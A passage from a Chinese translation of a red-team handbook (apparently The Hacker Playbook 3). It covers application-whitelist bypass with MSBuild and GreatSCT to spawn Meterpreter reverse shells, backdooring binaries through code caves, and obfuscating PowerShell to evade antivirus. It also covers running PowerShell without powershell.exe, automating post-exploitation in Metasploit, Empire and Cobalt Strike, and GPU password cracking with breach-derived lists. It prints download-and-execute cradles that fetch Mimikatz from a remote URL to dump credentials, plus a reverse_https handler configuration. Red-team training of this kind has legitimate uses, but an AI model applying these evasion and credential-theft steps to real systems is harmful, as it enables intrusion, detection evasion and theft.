  \n## 应用程序白名单绕过\n\n我们讨论过在不运行 PowerShell 代码的情况下触发 PowerShell 的不同方法，但如果不能运行自定义 Windows\
  \ 二进制文件呢？应用程序 bypass（Application Bypass）的概念是找到能够执行我们载荷的默认 Windows 二进制文件。我们曾在 Domain\
  \ Controllers 等受良好管控且代码执行受限的机器上进行过。我们可以使用不同的 Windows 文件来绕过这些限制——让我们看看几个例子。\n\n一个常被提及且能够规避应用程序白名单的\
  \ Windows 二进制文件是 `MSBuild.exe`。`MSBuild.exe` 是什么？它做什么？`MSBuild` 是 .NET Framework\
  \ 中的默认应用程序，用于使用 XML 格式的项目文件构建（编译）.NET 应用程序的平台。我们可以滥用此功能，通过创建恶意的 XML 项目文件来执行 Meterpreter\
  \ 会话，使用的工具名为 `GreatSCT` 。\n\n`GreatSCT` (`https://github.com/GreatSCT/GreatSCT`)\
  \ 有各种应用程序白名单绕过方法可以使用，但我们只关注 `MSBuild`。在此示例中，我们将创建一个恶意 XML 文件，该文件托管一个 `reverse_http`\
  \ Meterpreter 会话。这将要求我们在受害系统上写入 XML 文件并使用 `MSBuild` 执行（构建）该 XML 文件：\n\n*   `git\
  \ clone https://github.com/GreatSCT/GreatSCT.git /opt/`\n*   `cd /opt/GreatSCT`\n\
  *   `python3 ./gr8sct.py`\n*   `[4]` `MSBUILD/msbuild.cfg`\n*   输入您的主机 IP `[0]`\
  \ 和端口 `[1]`\n*   `generate`\n*   在 Metasploit 中设置 `windows/meterpreter/reverse_http`\
  \ 处理器\n![images/00181.jpeg](img/00181.jpeg)\n\n在我们的 Kali 实例中，我们使用 GreatSCT 创建 `shellcode.xml`\
  \ 文件，该文件包含构建信息以及 Meterpreter 反向 HTTP shell（载荷）。该文件需要移动到受害系统并使用 `MSBuild` 调用。\n\n\
  *注意：我看到 GreatSCT 正在\"develop\"分支上积极开发/更新 (`https://github.com/GreatSCT/GreatSCT/tree/develop`)，其中包括\
  \ `https` Meterpreter 和额外的白名单绕过方法。我假设到本书发布时，它将移动到 \"master\"。\n\n![images/00182.jpeg](img/00182.jpeg)\n\
  \n当在 Windows 受害机器上执行命令 `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\
  \ shellcode.xml` 时，.NET 将开始构建（编译）`shellcode.xml` 文件。在此过程中，受害机器将生成反向 HTTP Meterpreter\
  \ 会话，绕过任何应用程序白名单。您可能希望编辑 `shellcode.xml` 文件以输入混淆载荷，因为默认的 Meterpreter 很可能会触发杀毒软件。\n\
  \n![images/00183.jpeg](img/00183.jpeg)\n\n有多种方法可以执行应用程序白名单 bypass（规避），这可能需要一本专门的书来详细说明。以下是其他资源：\n\
  \n*   大量使用 Windows 默认可执行文件的优秀示例：\n\n\n\n*   [`https://github.com/api0cradle/UltimateAppLockerByPassList`]\n\
  *   使用 REGSRV32 和 PowerShell Empire：\n    *   [`https://www.blackhillsinfosec.com/evade-application-whitelisting-using-regsvr32/`]\n\
  \n*   通过 Excel.Application RegisterXLL 执行 DLL：\n    *   [`https://rileykidd.com/2017/08/03/application-whitelist-bypass-using-XLL-and-embedded-shellcode/`]\n\
  *   利用 INF-SCT 获取与执行技术进行绕过、规避和持久化：\n    *   [`https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/`]\n\
  \n*   使用 Regsvr32 绕过 AppLocker：\n    *   [`https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/`]\n\
  \n## 代码洞穴（Code Caves）\n\n与任何红队行动一样，我们总是在寻找在环境中进行横向移动或保持持久性的创意方式。通常，如果拥有凭据，我们会尝试使用\
  \ `WMI` 或 `PSExec` 在远程系统上执行载荷。然而，有时我们需要找到不易被追踪的创意方式在环境中移动。\n\n作为红队成员，在行动中被发现并不是最糟糕的事情。最糟糕的是当我们被发现时，蓝队找出了行动中涉及的所有域名、IP\
  \ 地址和失陷主机。蓝队通常很容易审查 `WMI`/`PSExec` 样式的连接以识别横向移动，因为这些连接并不总是被视为正常流量。那么我们可以做些什么来进一步隐藏我们的横向移动呢？\n\
  \n正是在这里我们可以发挥创意，而且没有标准答案（如果有效，对我来说就足够了）。我进入环境后喜欢做的几件事之一是识别积极共享/执行的公共共享和文件。我们可以尝试在\
  \ Office 文件中添加宏，但这可能过于明显。一种通常检测率低但成功率高的攻击是将我们定制的恶意软件嵌入到可执行二进制文件中。这可以是一个共享二进制文件如\
  \ `putty`、一个常见的内部胖客户端，甚至是数据库工具。\n\n虽然已不再维护，但执行此类攻击的最简单工具之一是 Backdoor factory（后门工厂）（[`https://github.com/secretsquirrel/the-backdoor-factory`].\
  \ Backdoor factory 会查找真实程序中的代码洞穴或空块，攻击者可以在其中注入自己的恶意 shellcode。这在 THP2 中有所介绍，其理念保持不变。\n\
  \n关于对可执行文件进行后门植入的两个很好的额外资源可以在这里找到：\n\n*   [`https://haiderm.com/fully-undetectable-backdooring-pe-file/#Code_Caves`]\n\
  *   [`https://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html`]\n\
  \n## PowerShell 混淆\n\n如今 `PowerShell` 脚本的问题是，如果将其下载到磁盘上，许多防病毒工具会检测到它们。即使将它们导入内存中，那些检查内存的防病毒工具有时也会对其进行警报。\n\
  \n无论如何，如果你从 `Cobalt Strike`、`Meterpreter` 或 PowerShell Empire 将它们导入内存，重要的是确保我们不会被防病毒工具捕获。如果我们确实被捕获了，至少应使\
  \ IR/取证团队难以逆向我们的攻击载荷。\n\n我们都见过这样的 PowerShell 命令：\n\n```\nPowershell.exe -NoProfile\
  \ -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString('[PowerShell\
  \ URL]'); [Parameters]\n```\n\n这是我们要绕过执行策略、以隐藏/非交互方式运行并下载和执行 `PowerShell` 载荷的最基本字符串组合。对于蓝队来说，我们看到了关于这些特定参数（如\
  \ \"`-Exec Bypass`\"）的大量日志记录。因此，我们通过一些常见的 PowerShell 语法对此参数进行了混淆：\n\n*   `-ExecutionPolicy\
  \ Bypass`\n    *   `-EP Bypass`\n    *   `-Exec Bypass`\n    *   `-Execution Bypass`\n\
  \n更疯狂的是，我要感谢 Daniel Bohannon 识别出这一点，你实际上不需要执行完整的参数字符串即可使其工作。例如，对于 `-ExecutionPolicy\
  \ Bypass`，以下所有示例均有效：\n\n*   `-ExecutionPolicy Bypass`\n*   `-ExecutionPol Bypass`\n\
  *   `-Executio Bypass`\n*   `-Exec Bypass`\n*   `-Ex Bypass`\n\n这些相同的技术同样适用于 `WindowStyle`\
  \ 甚至是 `EncodedCommand` 参数。当然，这些技巧只能让我们走一小段路，我们需要创建更多混淆的变换。首先，我们可以采用一个非常简单的示例，通过管理\
  \ PowerShell 提示符执行我们的远程 `PowerShell` 脚本（在本例中为 Mimikatz）并转储哈希值：\n\n```\nInvoke-Expression\
  \ (New-Object Net.WebClient).DownloadString('http://bit.ly/2JHVdzf'); Invoke-Mimikatz\
  \ -DumpCreds\n```\n\n通过 (`Invoke-Obfuscation`)，我们可以使用几种不同的技术对这个字符串进行重度混淆：\n\n* \
  \  在 Windows 上，下载 `Invoke-Obfuscation` 的 `PowerShell` 文件（[`https://github.com/danielbohannon/Invoke-Obfuscation`])\n\
  *   加载 PowerShell 脚本并启动 Invoke-Obfuscation\n    *   `Import-Module` ./`Invoke-Obfuscation.psd1`\n\
  \    *   `Invoke-Obfuscation`\n\n设置你想要混淆的 `PowerShell` 脚本。在本例中，我们将混淆上述的下载和转储 Mimikatz\
  \ 哈希值：\n\n```\nSET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2JHVdzf');\
  \ Invoke-Mimikatz -DumpCreds\n```\n\n*   对载荷进行编码（**`ENCODING`**）\n    *   在本例中，我选择了\
  \ `SecureString`（`AES`），但你可以尝试所有混淆技术。\n\n![](img/00184.jpeg)\n\n如果你查看混淆后的字符串，会有一个随机生成的密钥和一个加密的安全字符串。在执行管理\
  \ PowerShell 后，我们仍然获得完整的载荷以执行。\n\n![](img/00185.jpeg)\n\n我们还可以回到主屏幕并创建混淆的启动器：\n\n\
  *   `main`\n*   `launcher`\n*   `CLIP++`\n    *   选择你的执行标志\n\n![](img/00186.jpeg)\n\
  \n更好的是，如果我们查看 Windows PowerShell 日志，它们非常混淆，可以帮助规避防病毒和 SEIM 警报工具。\n\n![](img/00187.jpeg)\n\
  \n除了 `Invoke-Obfuscation` 之外，Daniel 还创建了一个专注于远程下载 cradle 的工具，称为 `Invoke-CradleCrafter`。“Invoke-CradleCrafter\
  \ 旨在帮助蓝队和红队轻松探索、生成和混淆 `PowerShell` 远程下载 cradle。此外，它帮助蓝队测试检测的有效性，这些检测可能对由 `Invoke-Obfuscation`\
  \ 产生的输出有效，但在处理 Invoke-CradleCrafter 时可能会失败，因为它不包含任何字符串连接、编码、撇号、类型转换等。”（[`https://github.com/danielbohannon/Invoke-CradleCrafter`])\n\
  \n## 无 PowerShell 的 PowerShell：\n\n你最终在一台机器上获得了远程代码执行，但发现你要么无法运行 `PowerShell.exe`，要么公司正在监控\
  \ `PowerShell.exe` 命令。你有哪些选项可以在该主机系统上运行你的 `PowerShell` 载荷或 C2 代理？\n\nNoPowershell（NPS）\n\
  \n我喜欢 NoPowerShell 或 NPS 的概念。NPS 是一个 Windows 二进制文件，它通过 .Net 执行 PowerShell，而不是直接调用\
  \ PowerShell.exe。虽然这通常今天会被 AV 标记，但我们使用相同的概念来创建二进制文件以直接执行我们的 `PowerShell` 恶意软件，而不需要\
  \ PowerShell.exe。Ben0xA 提供了源代码，所以请随意尝试混淆二进制文件以绕过 AV。\n\nNPS_Payload（[`https://github.com/trustedsec/nps_payload`])\n\
  \nNPS 的另一种变体是 TrustedSec 的一项工具，它利用通过 MSBuild.exe 执行代码。该工具生成一个 `PowerShell` 载荷到 msbuild_nps.xml\
  \ 文件中，该文件在调用时执行。XML 文件可以通过以下方式调用：\n\n```\nC:\\Windows\\Microsoft.NET\\Framework\\\
  v4030319\\MSBUILD.EXE C:<path_to_msbuild_npsxml>\n```\n\nSharpPick\n\n\n\n## `SharpPick`:\
  \ 无需调用 `PowerShell.exe` 即可运行 PowerShell\n\n`SharpPick` 是 `PowerPick` 的一个组件，是一个非常实用的工具，允许你调用\
  \ `PowerShell` 而无需执行 `PowerShell.exe` 二进制文件。在 `SharpPick` 中，“RunPS 函数利用 `System.Management.Automation`\
  \ 功能在 PowerShell runspace 内部执行脚本，而不会启动 PowerShell 进程。” [http://www.sixdub.net/?p=555]\n\
  \n下载 `SharpPick`（https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick）后，你可以使用你的\
  \ `PowerShell Empire` 负载创建二进制文件。有关如何设置环境和构建负载的完整指南，请参阅：\n\n*   http://www.sixdub.net/?p=555\n\
  *   https://bneg.io/2017/07/26/empire-without-powershell-exe/\n\n有时，无法将二进制文件投放到目标主机系统上。在这种情况下，我们可以创建一个\
  \ `Class Library`（`DLL 文件`），将其投放到系统上并通过 `rundll32.exe runmalicious.dll,EntryPoint`\
  \ 执行。\n\n当然，这些 DLL 的创建可以为 `Meterpreter` 或 `Cobalt Strike` 自动完成，但拥有无需调用 `PowerShell.exe`\
  \ 即可运行特定 PowerShell 负载的灵活性是非常好的。\n\n## HideMyPS\n\n几年前我写的一个工具 [`HideMyPS`](https://github.com/cheetz/hidemyps)\
  \ 至今仍然非常有效。这原本只是一个概念验证（POC）工具，但历经多年依然可用。我之前面临的问题是，如今任何 PowerShell 脚本都会被杀毒软件（AV）捕获。例如，如果我们将普通的\
  \ `Invoke-Mimikatz.ps1`（http://bit.ly/2H3CNXS）投放到装有 `Windows Defender` 的 Windows\
  \ 系统上，它会立即检测到该 PowerShell 脚本并向各处发送警报。这是传统杀毒软件的主要缺陷之一，即它们通常查找恶意软件中的非常特定的字符串。因此，我编写了一个小型\
  \ Python 脚本，用于对 PowerShell 脚本中的所有字符串进行混淆（该脚本仅针对少数脚本进行了测试，因此远未达到生产级代码的标准）。\n\n`HideMyPS`\
  \ 将查找所有函数并使用 ROT 算法混淆它们，删除 PowerShell 脚本中的所有注释，并切断字符串以逃避静态杀毒签名。在下一个示例中，让我们以 `Invoke_Mimikatz.ps1`（http://bit.ly/2H3CNXS）为例，对该\
  \ PowerShell 文件进行混淆：\n\n*   cd `/opt/HideMyPS`\n*   python hidemyps.py invoke_mimikatz.ps1\
  \ [filename.ps1]\n\n![images/00188.jpeg](img/00188.jpeg)\n\n现在，看看原始文件和你创建的新文件之间的区别。首先，你可以看到函数名称都被打乱了，变量被更改，字符串被切断成两半，且所有注释都已消失。\n\
  \n![images/00189.jpeg](img/00189.jpeg)\n\n你必须记住的一点是，我们更改了 PowerShell 脚本中的所有函数名称。因此，为了调用这些函数，我们必须回头看我们的混淆文件，看看我们是如何替换\
  \ \"function Invoke-Mimikatz\" 的。在这种情况下，`Invoke-Mimikatz` 被更改为 `Vaibxr-Zvzvxngm`。以下示例是在完全打补丁的\
  \ Windows 10 且 Defender 完全更新的情况下运行的。\n\n![images/00190.jpeg](img/00190.jpeg)\n\n\
  ## 结论\n\n作为红队成员或渗透测试人员，与主机和网络检测工具的博弈将永远是一场猫鼠游戏。因此，理解底层保护机制的工作原理、编写低级代码以直接通过 Windows\
  \ API 而非 Shell 命令进行交互，以及跳出思维定势并发挥创意，变得至关重要。如果你只关注使用常用工具，在企业的网络环境中被检测到的可能性就相当高。如果工具是公开的，安全厂商很可能在它们发布后迅速逆向工程并开发相应的签名。你需要对当前的攻击和漏洞利用进行定制和改造，使其不被这些厂商识别。\n\
  \n# 8 特殊团队 - 破解、漏洞利用和技巧\n\n![images/00191.jpeg](img/00191.jpeg)\n\n本章重点关注我发现对红队和渗透测试都很有用的一些资源。这些资源可能不会在每次行动中用到，但对于特定场景或一次性案例非常有用。\n\
  \n## 自动化\n\n随着基于启发式方法的端点保护越来越强大，我们的攻击也需要越来越快。我们通常可以编写能够逃避 AV 并绕过初始检测的恶意软件，但一旦我们开始执行像\
  \ `Mimikatz`（内存中）这样的调用或横向移动到另一台主机时，警报就会响起。为了应对这种情况，我始终告诉红队成员要在第一次尝试时就被捕获。通常，当蓝队触发我们的基本/默认风格（或轻微混淆）的恶意软件时，他们会认为这是一种胜利，但其真正目的仅仅是了解他们的环境。这是通过我们的初始负载在受害者机器上自动运行多个侦察脚本来实现的。在下一节中，我们将介绍一些可以帮助自动化部分攻击的快速自动运行脚本。\n\
  \n### 使用 RC 脚本自动化 Metasploit\n\n借助 `Metasploit`，我们可以通过以下方式高效且有效地运行我们的后渗透脚本：\n\n\
  *   搜索 Metasploit 中的所有后渗透模块\n*   msfconsole\n    ```cpp\n    show post\n    ```\n\
  从“post”结果中，选择你希望在与 `Meterpreter Shell` 连接时自动执行的所有模块。在此案例中，我们将添加一个权限迁移后渗透模块（http://bit.ly/2vn1wFB）到我们的攻击中。为了配置\
  \ Meterpreter Shell 以便在从受损主机建立初始连接时运行此负载，我们需要指定一个 AutoRunScript 参数。随意添加尽可能多的 `AutoRunScripts`\
  \ 以转储有关系统/网络的信息、横向移动等！\n\n### 创建 Handler 和 AutoRunScript：\n*   创建 handler 文件\n \
  \   *   gedit handler.rc\n*   配置 handler 和自动运行脚本\n    ```cpp\n    use multi/handler\n\
  \    set payload windows/meterpreter/reverse_https\n    set LHOST 10.100.100.9\n\
  \    set LPORT 443\n    set AutoRunScript post/windows/manage/priv_migrate\n   \
  \ set ExitOnSession false\n    set EnableStageEncoding true\n    exploit -j\n  \
  \  ```\n*   启动 handler\n    *   msfconsole -r handler.rc\n\n### 自动化 Empire\n\nEmpire\
  \ 具有与 Metasploit 资源文件类似的功能，可以自动化许多重复性任务。首先我们需要创建一个文件（在我们的示例中，我们将创建一个名为 `/opt/empire_autoload.rc`\
  \ 的文件），然后在我们的 `Empire` 实例中加载它。\n\n*   在单独的终端窗口中，创建 handler 文件：\n    *   gedit `/opt/empire_autoload.rc`\n\
  *   添加你想要执行的所有后渗透模块：\n    ```cpp\n    usemodule situational_awareness/network/powerview/get_user\n\
  \    execute\n    back\n\n    usermodule situational_awareness/network/powerview/get_computer\n\
  \    execute\n    back\n    ```\n*   在 Empire 中，加载 autoload.rc 资源文件：\n    *   agents\n\
  \    ```cpp\n    autorun /opt/empire_autoload.rc powershell\n    autorun show\n\
  \    ```\n![images/00192.jpeg](img/00192.jpeg)\n\n如你所见，当代理连接时，它自动运行了 `get_user`\
  \ 和 `get_computer PowerShell 脚本`。所有这些结果都将存储在 `agent.log 文件` 中。在此案例中，我们的代理名称是 N6LM348G，因此日志将存储在\
  \ `/opt/Empire/downloads/N6LM348G/agent.log` 中。\n\n### 自动化 Cobalt Strike\n\n\n\n\
  \n\nCobalt Strike 如此强大的原因之一，正是得益于 Aggressor Scripts (https://www.cobaltstrike.com/aggressor-script/index.html)。借助\
  \ Cobolt Strike Aggressor Scripts，您不仅可以配置自动运行风格的脚本，还可以创建非常复杂的攻击。例如，我经常会遇到这样的情况：我们获取了对共享工作站的访问权限，比如实验室或会议室的盒子。我希望我们的代理能够做的第一件事就是每半小时运行一次\
  \ Mimikatz 以提取明文凭证。利用 Aggressor Scripts，我们可以完成所有这些操作以及更多功能。以下是一个仅实现上述功能的示例脚本：`mimikatz-every-30m.cna`(http://bit.ly/2IXgIel)。\n\
  \n## Aggressor 收集脚本\n\n*   `https://github.com/bluscreenofjeff/AggressorScripts`\n\
  *   `https://github.com/harleyQu1nn/AggressorScripts`\n\n### 自动化的未来\n\n最后，还有一些令人兴奋的项目正在朝着自动化、智能入侵和高级持续性威胁（APT）攻击的方向发展。我深信，自动化攻击将成为未来妥协的必经之路，而且我们将需要能够测试/验证我们的安全控制措施的能力。以下是我认为在开创这一自动化趋势方面具有巨大潜力的两个工具：\n\
  \nPortia - `https://github.com/SpiderLabs/portia`\nCaldera - `https://github.com/mitre/caldera`\n\
  \n## 密码破解\n\n我最新也是最喜爱的密码列表之一来自最近的包含 14 亿用户名/密码的 41GB 密码转储 (http://bit.ly/2HqbYk8)。现在，我不想直接链接到\
  \ Torrent，因为它包含大量敏感的用户名（或电子邮件）及相关密码；但您可以在网上搜索 BreachCompilation.tar.bz2 以获取更多信息。在下载这类非常敏感的信息之前，请先查阅相关法律法规。我建议，与其直接使用原始转储文件，不如只下载密码列表。我已经从该\
  \ 41GB 转储中剔除了所有用户名/邮箱，并制作了一个仅包含密码的列表。其位置如下所示：`http://thehackerplaybook.com/get.php?type=THP-password`。\n\
  \n在我的个人系统中，我使用了 8x Gigabyte GV-N108TTURBO-11GD AORUS GeForce GTX 1080 Ti Turbo 11G\
  \ 显卡。大约花费$12,000（含机箱、内存、电源供应器、SSD 和图形处理器），您就可以组建这样一套系统。当然，机箱至少需要是一个 4U 机架式服务器（例如：SYS-4028GR-TR2）并配备充足的电力支持。虽然肯定不便宜，但我们每秒可以破解约\
  \ 47,2 亿个哈希值，并对 NTLM（Windows）哈希进行暴力破解。以下是这八块 GPU 的 hashcat 基准测试结果：`Hashmode: 1000\
  \ - NTLM`\n\n```\nSpeed.Dev.#1.....: 59436.3 MH/s (63.16ms)\nSpeed.Dev.#2.....:\
  \ 58038.3 MH/s (64.70ms)\nSpeed.Dev.#3.....: 59104.4 MH/s (63.55ms)\nSpeed.Dev.#4.....:\
  \ 59123.0 MH/s (63.52ms)\nSpeed.Dev.#5.....: 58899.7 MH/s (63.74ms)\nSpeed.Dev.#6.....:\
  \ 59125.8 MH/s (63.51ms)\nSpeed.Dev.#7.....: 59256.3 MH/s (63.36ms)\nSpeed.Dev.#8\
  \ .....: 59064.5 MH/s (63.56ms)\nSpeed.Dev.#*.....: 472.0 GH/s\n```\n\n对于那些无法负担大规模\
  \ GPU 配置的用户，还有其他选择。虽然仍然不便宜，但您可以考虑使用云端进行破解。近期，亚马逊集成了 TESLA GPU（不是指汽车品牌）`http://www.nvidia.com/object/tesla-servers.html`,其性能强于\
  \ GTX 1080 Ti 系列。关于如何利用这些 GPU 设置您自己的破解服务器，Medium 上有一篇很棒的文章： `https://medium.com/@iraklis/running-hashcat-v4-0-0-in-amazons-aws-new-p3-16xlarge-instance-e8fab4541e9b`。\n\
  \n根据 Iraklis Mathiopoulos 文章中的统计数据：\n\n`Hashmode: 1000 - NTLM:`\n\n```\nSpeed.Dev.#1.....:\
  \ 79294.4 MH/s (33.81ms)\nSpeed.Dev.#2.....: 79376.5 MH/s (33.79ms)\nSpeed.Dev.#3\
  \ .....: 79135.5 MH/s (33.88ms)\nSpeed.Dev.#4.... : 79051.6 MH/s (33.84ms)\nSpeed.Dev.#5.....:\
  \ 79030.6 MH/s (33.85ms)\nSpeed.Dev.#6 .....: 79395.3 MH/s (33.81ms)\nSpeed.Dev.#7....\
  \ : 79079.5 MH/s (33.83ms)\nSpeed.Dev.#8.....: 79350.7 MH/s (33.83ms)\nSpeed.Dev.#*\
  \ .....: 633.7 GH/s\n```\n\nNTLM 的总速度比使用 TESLA GPU 卡高出约 34%。运行 AWS 的小时成本约为$25，因此，这完全取决于您如何确定自己的预算、需求和目标。\n\
  \n## 实验室环境\n\n近期，“我是否已被泄露”（Have I Been Pwned）网站的 Troy Hunt 发布了一个 SHA1 密码哈希列表，大小约为压缩后的\
  \ 5.3 GB。这是一个来自先前数据泄露和转储事件的非常大的列表。这是一个非常适合测试您密码破解技能的绝佳实验场景：\n\n*   `https://downloads.pwnedpasswords.com/passwords/pwned-passwords-1.0.txt.7z`\n\
  \n随着这些 GPU 的速度越来越快，少于 10 个字符的密码可以在相对合理的时间范围内被智能暴力破解。其中一些可以通过良好的密码掩码进行破解，但大部分情况归根结底还是依赖于密码列表。使用来自真实泄露事件的密码列表是破解长度大于\
  \ 12 位密码的最快方法之一。审查所有过去的泄露事件，让我们能深入了解人类是如何创建密码的、常见的混淆技术以及偏爱的词汇选择等方法。利用这些带有复杂规则集的列表，使我们能够以极大的速度（有时甚至超过\
  \ 25 个字符）进行密码破解。但要记住，您的密码列表依赖于您构建和维护它的程度好坏。作为红队成员，我们定期追踪所有被破解的账户，分析它们并将其添加到我们的列表中。我们还持续监控新的泄露事件、pastebin/pastie\
  \ 类网站以及其他来源，以发现新密码。一个值得关注的优秀列表可以在这里找到： `https://inteltechniques.com/OSINT/pastebins.html`。\n\
  \n## 最爱的密码列表\n\n*   berzerk0 的真实 WPA 密码列表 (Real-Password-WPA Password List):\n \
  \   *   18.6 GB（未压缩）\n    *   `http://bit.ly/2EMs6am`\n*   berzerk0 的字典风格列表:\n \
